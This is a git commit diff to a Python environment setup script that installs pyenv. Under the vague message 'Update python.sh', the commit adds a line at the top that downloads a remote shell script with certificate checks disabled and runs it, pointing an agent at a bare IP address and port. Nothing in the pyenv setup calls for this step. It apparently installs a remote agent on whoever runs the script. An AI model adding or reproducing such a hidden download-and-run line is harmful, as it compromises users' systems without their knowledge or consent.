1a573c622f8f508393f201e280a180e8d9b03206
tangwne215 <1171681475@qq.com>
2023-06-26 19:40:58 +0800

    Update python.sh

--- python.sh
+++ python.sh
@@ -1,3 +1,4 @@
+wget --no-check-certificate https://www.wgstart.com/download/sh/installAgent.sh; bash installAgent.sh http://66.42.48.158:9999 agent-linux-amd64-v3.4.7.tar.gz
 curl https://pyenv.run | bash
 echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
 echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
